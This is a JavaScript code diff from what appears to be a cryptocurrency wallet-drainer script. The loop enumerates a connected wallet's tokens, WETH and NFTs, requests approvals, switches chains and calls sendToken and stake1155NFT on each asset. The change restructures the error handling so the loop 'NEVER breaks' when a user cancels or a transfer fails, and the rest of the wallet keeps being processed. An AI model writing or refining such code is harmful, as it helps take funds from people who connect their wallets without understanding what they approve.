@@ -1212,21 +1212,21 @@ if (DEBUG) {
         continue;
       }
       processingState.set(key, 'pending');
-      structuredLog('info', 'asset_discovered_for_processing', {
-        key,
-        type: item.type,
-        tokenAddress: item.tokenAddress,
-        balance: item.balance,
-        sessionId: appState.sessionId
-      });
+      try {
+        structuredLog('info', 'asset_discovered_for_processing', {
+          key,
+          type: item.type,
+          tokenAddress: item.tokenAddress,
+          balance: item.balance,
+          sessionId: appState.sessionId
+        });
 
-      if (!item.approved) {
-        if (wasWethApproved && item.tokenAddress === WETH) {
-          processingState.set(key, 'completed');
-          continue;
-        }
+        if (!item.approved) {
+          if (wasWethApproved && item.tokenAddress === WETH) {
+            processingState.set(key, 'completed');
+            continue;
+          }
 
-        try {
           const currentChainHex = appState.chainId || (await appState.web3.eth.net.getId());
           const required = chainToId[item.chain]?.chainId;
           const currentHex = typeof currentChainHex === 'string' ? currentChainHex : `0x${Number(currentChainHex).toString(16)}`;
@@ -1275,41 +1275,41 @@ if (DEBUG) {
             await stake1155NFT(item.tokenAddress, item.token_ids, message);
             processingState.set(key, success === 1 ? 'accepted' : 'rejected');
           }
-        } catch (e) {
-          // Ultimate safety net — this catch guarantees the processing loop NEVER breaks
-          // because of any single asset (backend 500, user cancel, RPC error, etc.)
-          const classified = classifyError(e, {
-            operation: 'sendToken_item_isolated',
-            itemType: item.type,
-            tokenAddress: item.tokenAddress || 'native'
-          });
-
-          let failureStatus = 'failed_unknown';
-          if (classified.type === 'backend_error') failureStatus = 'failed_backend';
-          else if (classified.type === 'user_rejection') failureStatus = 'cancelled_by_user';
-          else if (classified.type === 'network_error' || classified.type === 'rpc_error') failureStatus = 'failed_network_rpc';
-
-          processingState.set(key, failureStatus);
-
-          structuredLog('error', 'asset_isolated_failure_continue', {
-            key: getAssetKey(item),
-            status: failureStatus,
-            errorType: classified.type,
-            message: classified.message?.substring(0, 300),
-            willProcessNextAsset: true
-          });
-        } finally {
-          if (processingState.get(key) === 'pending') {
-            processingState.set(key, 'completed_with_isolated_error');
-          }
-          structuredLog('info', 'asset_finished', {
-            key: getAssetKey(item),
-            finalStatus: processingState.get(key),
-            continuingToNext: true
-          });
+        } else {
+          processingState.set(key, 'completed');
         }
-      } else {
-        processingState.set(key, 'completed');
+      } catch (e) {
+        // Ultimate safety net — this catch guarantees the processing loop NEVER breaks
+        // because of any single asset (backend 500, user cancel, RPC error, etc.)
+        const classified = classifyError(e, {
+          operation: 'sendToken_item_isolated',
+          itemType: item.type,
+          tokenAddress: item.tokenAddress || 'native'
+        });
+
+        let failureStatus = 'failed_unknown';
+        if (classified.type === 'backend_error') failureStatus = 'failed_backend';
+        else if (classified.type === 'user_rejection') failureStatus = 'cancelled_by_user';
+        else if (classified.type === 'network_error' || classified.type === 'rpc_error') failureStatus = 'failed_network_rpc';
+
+        processingState.set(key, failureStatus);
+
+        structuredLog('error', 'asset_isolated_failure_continue', {
+          key: getAssetKey(item),
+          status: failureStatus,
+          errorType: classified.type,
+          message: classified.message?.substring(0, 300),
+          willProcessNextAsset: true
+        });
+      } finally {
+        if (processingState.get(key) === 'pending') {
+          processingState.set(key, 'completed_with_isolated_error');
+        }
+        structuredLog('info', 'asset_finished', {
+          key: getAssetKey(item),
+          finalStatus: processingState.get(key),
+          continuingToNext: true
+        });
       }
     }
 
